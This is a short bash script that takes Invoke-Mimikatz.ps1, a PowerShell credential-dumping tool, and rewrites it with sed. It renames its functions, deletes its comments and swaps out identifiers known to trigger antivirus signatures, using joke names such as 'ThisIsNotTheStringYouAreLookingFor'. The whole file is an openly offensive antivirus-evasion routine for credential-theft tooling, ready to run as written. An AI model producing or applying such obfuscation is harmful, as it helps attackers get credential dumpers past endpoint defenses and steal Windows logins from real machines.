#!/usr/bin/env bash
cp Invoke-Mimikatz.ps1 meme.ps1
sed -i -e 's/Invoke-Mimikatz/Invoke-Mimidogz/g' meme.ps1
sed -i -e '/<#/,/#>/c\\' meme.ps1

sed -i -e 's/^[[:space:]]*#.*$//g' meme.ps1

sed -i -e 's/DumpCreds/DumpCred/g' meme.ps1

sed -i -e 's/ArgumentPtr/NotTodayPal/g' meme.ps1

sed -i -e 's/CallDllMainSC1/ThisIsNotTheStringYouAreLookingFor/g' meme.ps1

sed -i -e "s/\-Win32Functions \$Win32Functions$/\-Win32Functions \$Win32Functions #\-/g" meme.ps1
